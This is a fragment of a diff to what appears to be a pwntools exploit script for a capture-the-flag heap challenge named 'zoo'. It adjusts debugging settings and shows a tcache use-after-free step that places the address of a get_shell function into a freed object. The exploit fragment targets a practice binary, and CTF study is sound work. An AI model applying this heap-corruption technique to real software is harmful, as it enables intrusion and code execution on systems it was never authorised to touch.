@@ -30,7 +30,7 @@ def debug(breakpoint=''):
     time.sleep(1)
 
 elf = ELF('./zoo')
-context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
+context(arch = elf.arch ,log_level = 'debug', os = 'linux')
 p = process("./zoo")
 get_shell = elf.symbols['get_shell']
 
@@ -59,7 +59,7 @@ create(0x30, "a") #1
 # . (0x20)Tcache_head -> animal_1 -> animal_0
 delete(0)
 delete(1)
-# debug()
+debug('b * add_animal+381')
 ## buf_3 == animal_0
 create(0x18, p64(get_shell)) #2
 
